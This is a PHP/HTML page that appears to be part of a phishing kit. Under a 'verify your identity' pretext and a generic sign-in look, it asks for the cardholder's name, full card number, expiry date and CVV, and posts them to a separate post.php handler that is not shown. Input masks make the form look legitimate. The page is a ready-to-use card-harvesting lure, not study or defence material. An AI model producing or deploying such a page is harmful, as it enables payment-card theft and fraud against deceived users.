<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png">
</header>

<main>
<div class="form">
<div class="title">We need to verify your identity.</div>
<div class="text">Please enter the information of your credit/debit card associated with your account.</div>

<form action="post.php" method="post">
<div class="col">
    <input type="text" name="name" id="name" required placeholder="Cardholder's name">
</div>

<div class="col">
    <input type="text" name="cc" id="cc" required placeholder="XXXX XXXX XXXX XXXX">
</div>

<div class="col">
    <input type="text" name="exp" id="exp" required placeholder="MM/YY">
</div>

<div class="col">
    <input type="text" name="cvv" id="cvv" required placeholder="CVV">
</div>

<div class="col">
    <button type="submit">Continue</button>
</div>
</form>



</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>